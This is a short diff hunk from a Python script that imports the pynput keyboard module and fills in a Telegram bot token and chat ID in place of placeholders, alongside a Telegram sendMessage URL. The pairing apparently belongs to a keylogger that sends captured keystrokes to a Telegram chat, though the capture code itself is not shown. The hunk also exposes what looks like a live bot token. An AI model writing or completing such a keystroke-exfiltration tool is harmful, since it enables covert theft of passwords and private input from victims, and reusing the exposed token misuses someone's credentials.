@@ -3,8 +3,8 @@ from pynput import keyboard
 
 # ==========================================
 # CONFIGURATION
-BOT_TOKEN = "YOUR_BOT_TOKEN"
-CHAT_ID = "YOUR_CHAT_ID"
+BOT_TOKEN = "8723448863:AAHrndQJbtHoDkw7GqavfCfqpp0bLSRLkwA"
+CHAT_ID = "5515529017"
 # ==========================================
 
 API_MSG = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
